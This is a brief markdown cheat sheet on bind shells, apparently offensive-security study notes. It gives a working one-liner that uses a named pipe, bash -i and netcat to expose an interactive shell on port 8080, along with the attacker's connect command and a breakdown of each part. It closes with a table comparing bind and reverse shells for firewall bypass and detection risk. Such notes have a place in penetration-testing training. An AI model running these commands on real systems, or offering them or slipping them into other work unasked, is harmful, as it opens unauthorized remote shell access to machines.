# 🔗 Bind Shell

## Concept
The **target** opens a port and **waits**. The **attacker connects in**. Opposite of reverse shell.

```
Attacker ──connects IN──► Target (nc -l 0.0.0.0 8080)
                                    ↓
                          Attacker gets shell
```

---

## How It Works — 2 Steps

**Step 1 — Run payload on target (opens listening port)**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Step 2 — Attacker connects to target**
```bash
nc -nv TARGET_IP 8080
```

---

## Payload Breakdown
```bash
rm -f /tmp/f            # Clean up old pipe
mkfifo /tmp/f           # Create named pipe
cat /tmp/f              # Read input from pipe
| bash -i 2>&1          # Feed into interactive shell + capture errors
| nc -l 0.0.0.0 8080    # Listen on ALL interfaces, port 8080
>/tmp/f                 # Loop back for bidirectional comms
```
> ⚠️ Port 8080 used because ports below 1024 require root/elevated privileges.

---

## Reverse Shell vs Bind Shell

| | Reverse Shell | Bind Shell |
|---|---|---|
| **Who connects** | Target → Attacker | Attacker → Target |
| **Listener** | Attacker's machine | Target's machine |
| **Firewall bypass** | ✅ Easy (outbound) | ❌ Hard (inbound blocked) |
| **Detection risk** | Lower | Higher (port stays open) |
| **When to use** | Target allows outbound | Target blocks outbound |

> 🔑 **Prefer reverse shells** — bind shells leave an open port detectable by security tools.
